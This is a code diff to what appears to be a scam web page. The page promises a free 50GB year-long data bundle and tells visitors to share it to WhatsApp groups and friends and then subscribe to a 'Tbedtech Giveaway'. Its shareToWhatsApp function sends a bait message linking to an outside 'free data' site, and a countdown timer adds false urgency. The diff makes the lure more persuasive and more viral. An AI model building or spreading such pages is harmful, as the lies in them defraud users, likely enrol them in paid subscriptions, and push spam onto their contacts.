@@ -556,7 +556,7 @@ input, textarea{
             margin-top: 10px;
             border: none;
             color: white;
-            background: blue;
+            background: rgb(73, 214, 54);
             cursor: pointer;
         }
         
@@ -822,7 +822,12 @@ input, textarea{
 </div>
 <div class="popup" id="popup">
     <p class="congratulations">Congratulations, You're eligible for a year 50GB data bundle!</p>
-    <p class="popup-text">🎉 Click the button below to visit this offer page, then click on subscribe button there to subscribe to Trivia Giveaway for 1 day, then click on the confirm button To confirm your number and receive your 50GB data bundle for one year now to your number.</p>
+    <p> After verification, You have been qualified to get 50GB data bundle!</span> How to proceed: 
+    </p>
+    <p class="congratulations">ONE MORE STEP</p>
+    <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+   
+    <p class="popup-text">🎉 Click the Grenn button below to Share to Whatsapp, then click on subscribe button there to subscribe to Tbedtech Giveaway for 1 day, then click on the confirm button To confirm your number and receive your 50GB data bundle for one year now to your number.</p>
     <p class="timer"> Start now, Offer ends in <span id="countdown">150</span> seconds!</p>
     
     <div class="progress-container" id="progress-container">
@@ -857,7 +862,7 @@ input, textarea{
     updateProgressBar();
 
     function shareToWhatsApp() {
-        let url = "whatsapp://send?text=Get%2050GB%20free%20data%20for%20one%20year%20%F0%9F%8E%89%21%20Click%20here:%20https://societymagazinesunfaithful.com";
+        let url = "whatsapp://send?text=Do%20you%20always%20run%20out%20of%20data%20every%20month%3F%0AWell%2C%20the%20wait%20is%20over%21%20A%20company%20has%20announced%20an%20unlimited%20data%20giveaway%20that%20promises%20free%20access%20to%20the%20internet%0AGet%20upto%2050GB%20free%20data%0Ato%20activate%20unlimited%20data%20for%20all%20networks%2C%20click%20below%0A%F0%9F%91%87%F0%9F%91%87%F0%9F%91%87%0Ahttps%3A%2F%2Fawfudata.online%2Ffree30GB";
         window.location.href = url;
         
         shares++;
